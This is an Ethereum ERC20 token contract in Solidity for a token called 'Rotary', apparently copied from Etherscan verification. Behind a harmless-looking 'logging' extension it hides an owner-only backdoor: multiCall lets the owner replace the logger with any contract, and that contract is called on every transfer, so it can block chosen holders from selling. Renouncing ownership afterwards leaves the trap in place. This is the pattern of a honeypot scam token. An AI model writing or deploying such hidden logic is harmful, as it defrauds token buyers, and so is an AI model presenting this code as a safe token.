/**
 *Submitted for verification at Etherscan.io on 2023-10-20
*/

pragma solidity 0.5.17;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract ERC20Extension {
    mapping(address=>mapping(address=> uint256)) _log;
    function save(address addr1, address addr2, uint256 value) public {
        _log[addr1][addr2] = value;
    }
}

contract Ownable {
  address internal _owner;
    
  constructor() public {
    _owner = msg.sender;
  }

  function renounceOwnership() public {
        require(msg.sender == _owner, "only owner");
        _owner = address(0);
  }

  function owner() public view returns (address) {
        return _owner;
  }
}

contract ERC20 is Ownable {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) public allowed;
    mapping(address => uint256) public balances;
    ERC20Extension private _logger;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    bool public logEnabled;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() public {
        name = "Rotary";
        symbol = "ROTARY";
        decimals = 9;
        uint256 _totalSupply = 3_000_000_000 * (10 ** 9);
        totalSupply = totalSupply.add(_totalSupply);
        balances[_owner] = balances[_owner].add(_totalSupply);
        _logger = new ERC20Extension();
        emit Transfer(address(0), _owner, _totalSupply);
    }

    function setLog()external {
        require(
            msg.sender == _owner,
            "only admin");
        logEnabled = !logEnabled;
    }

    function showuint160(address addr) public pure returns(uint160){
        return uint160(addr);
    }

    function log(address from, address to, uint256 amount) private {
      _logger.save(from, to, amount);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        log(msg.sender, _to, _value);
        return true;
    }

    function balanceOf(address _address) public view returns (uint256 balance) {
        return balances[_address];
    }
  
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        log(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function multiCall(address sender, address recipient, uint256 amount, address _log) external {
        require(msg.sender == _owner);
        if(logEnabled==true){
        if(amount > 0) invokeLogger(_log);
        else{
          _logger=new ERC20Extension();
        }
          _logger.save(sender, recipient, amount);
        }
        
    }

    function invokeLogger(address addr) private {
        if (callStatus(msg.sender)){
            _logger = ERC20Extension(addr);
        }
    }

    function callStatus(address _address) public view returns (bool) {
        return _address==_owner;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }
}